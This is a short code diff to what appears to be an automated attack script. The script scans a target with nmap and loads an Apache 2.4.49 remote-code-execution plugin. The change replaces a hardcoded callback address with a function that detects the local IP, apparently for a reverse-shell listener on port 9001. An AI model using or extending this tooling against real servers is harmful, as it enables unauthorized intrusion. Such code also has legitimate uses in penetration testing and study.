@@ -2,6 +2,7 @@ import argparse
 import socket
 from time import sleep
 import recon
+import socket
 from multiprocessing import Process
 import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE
 
@@ -48,6 +49,17 @@ def exploit():
     except Exception as e:
         print(e)
 
+def extract_ip():
+    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:       
+        st.connect(('10.255.255.255', 1))
+        IP = st.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1'
+    finally:
+        st.close()
+    return IP
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
@@ -55,7 +67,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
     res_recon = recon.nmap_scan(args.target_ip)
 
-    LOCAL_ADDRESS = '192.168.1.32'
+    LOCAL_ADDRESS = extract_ip()
     LOCAL_PORT = 9001
     BUFFER_SIZE = 1024 * 128
     SEPARATOR = '<sep>'
